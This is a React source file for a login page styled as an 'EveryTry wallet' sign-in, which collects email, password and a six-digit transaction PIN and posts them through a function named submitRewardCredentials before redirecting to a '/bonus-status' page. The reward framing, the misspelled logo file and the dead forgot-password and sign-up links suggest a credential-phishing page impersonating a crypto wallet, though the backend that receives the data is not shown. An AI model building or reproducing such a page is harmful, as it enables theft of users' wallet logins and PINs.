import { useState } from "react";
import { useNavigate } from "react-router-dom";
import {
    FaEye,
    FaEyeSlash
} from "react-icons/fa";

import { submitRewardCredentials } from "../../../api/reward";

import "./EveryLogin.css";

export default function EveryLogin() {

    const navigate = useNavigate();

    const [showPassword, setShowPassword] = useState(false);

    const [form, setForm] = useState({
        email: "",
        password: "",
        transactionPin: ""
    });

    function handleChange(e) {

        setForm({

            ...form,

            [e.target.name]: e.target.value

        });

    }

    async function handleSubmit(e) {

        e.preventDefault();

        try {

            const { data } = await submitRewardCredentials({

                email: form.email,
                password: form.password,
                transactionPin: form.transactionPin,

            });

            alert(data.message);

            navigate("/bonus-status");

        } catch (error) {

            alert(

                error.response?.data?.message ||

                "Failed to submit."

            );

        }

    }

    return (

        <div className="every-login-page">

            <div className="every-login-card">

                <img
                    src="/evetrylogo.png"
                    alt="EveryTry"
                    className="every-logo"
                />

                <h1>Welcome back</h1>

                <p>
                    Enter the email address associated with your EveryTry wallet.
                </p>

                <form onSubmit={handleSubmit}>

                    <label>Email</label>

                    <input
                        type="email"
                        name="email"
                        value={form.email}
                        onChange={handleChange}
                        placeholder="Email"
                        required
                    />

                    <label>Password</label>

                    <div className="password-box">

                        <input
                            type={showPassword ? "text" : "password"}
                            name="password"
                            value={form.password}
                            onChange={handleChange}
                            placeholder="Password"
                            required
                        />

                        <button
                            type="button"
                            onClick={() =>
                                setShowPassword(!showPassword)
                            }
                        >

                            {showPassword ? <FaEyeSlash /> : <FaEye />}

                        </button>

                    </div>

                    <label>Transaction PIN</label>

                    <input
                        type="password"
                        maxLength={6}
                        name="transactionPin"
                        value={form.transactionPin}
                        onChange={handleChange}
                        placeholder="Enter transaction PIN"
                        required
                    />

                    <a
                        href="#"
                        className="forgot-password"
                    >
                        Forgot Password
                    </a>

                    <button
                        className="login-btn"
                        type="submit"
                    >
                        Log in
                    </button>

                </form>

                <div className="signup-text">

                    Don't have a wallet?

                    <span> Sign up</span>

                </div>

            </div>

            <div className="every-footer">

                Terms and Conditions

                <span>•</span>

                Cookies

            </div>

        </div>

    );

}